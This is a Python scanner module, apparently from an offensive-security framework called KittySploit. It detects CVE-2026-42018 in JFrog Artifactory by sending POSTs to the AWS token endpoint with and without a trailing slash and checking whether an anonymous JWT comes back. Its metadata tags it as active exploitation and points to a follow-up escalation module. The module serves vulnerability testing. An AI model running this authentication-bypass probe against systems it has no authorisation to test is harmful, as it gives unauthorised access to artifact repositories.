#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect JFrog Artifactory CVE-2026-42018 anonymous JWT via trailing slash."""

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "JFrog Artifactory CVE-2026-42018 Detect",
        "description": (
            "Detects CVE-2026-42018: POST /access/api/v1/aws/token/ (trailing slash) returns "
            "an internal anonymous-user JWT even when anonymous access is disabled."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2026-42018"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-42018",
            "https://www.netspi.com/blog/technical-blog/red-teaming/stealing-the-artifact-jfrog-artifactory-vulnerability/",
        ],
        "modules": ["auxiliary/admin/http/jfrog_artifactory_cve_2026_42016_escalate"],
        "tags": [
            "web",
            "scanner",
            "jfrog",
            "artifactory",
            "auth-bypass",
            "jwt",
            "cve-2026-42018",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.1,
            "noise": 0.25,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["jfrog", "artifactory"],
                "endpoint_pattern_any": ["/access/api/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "anonymous JWT"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/jfrog_artifactory_cve_2026_42016_escalate",
                ],
            },
        },
    }

    token_path = OptString(
        "/access/api/v1/aws/token/",
        "Trailing-slash AWS token endpoint",
        False,
        advanced=True,
    )

    @staticmethod
    def _looks_like_jwt(body: str) -> bool:
        text = (body or "").strip()
        if text.count(".") >= 2 and len(text) > 40:
            return True
        try:
            payload = json.loads(text)
        except json.JSONDecodeError:
            return False
        token = payload.get("access_token") or payload.get("token") or payload.get("accessToken")
        return isinstance(token, str) and token.count(".") >= 2

    def run(self):
        control = self.http_request(
            method="POST",
            path="/access/api/v1/aws/token",
            headers={"Content-Type": "application/json"},
            json={},
            allow_redirects=False,
        )
        probe = self.http_request(
            method="POST",
            path=str(self.token_path or "/access/api/v1/aws/token/"),
            headers={"Content-Type": "application/json"},
            json={},
            allow_redirects=False,
        )
        if not probe:
            return False
        code = int(probe.status_code or 0)
        body = probe.text or ""
        control_code = int(control.status_code or 0) if control else 0
        if code in (200, 201) and self._looks_like_jwt(body):
            if control_code in (401, 403, 404) or not self._looks_like_jwt((control.text or "") if control else ""):
                self.set_info(
                    severity="high",
                    cve="CVE-2026-42018",
                    reason="Trailing-slash AWS token endpoint returned anonymous JWT",
                    path=str(self.token_path or "/access/api/v1/aws/token/"),
                )
                return True
        return False
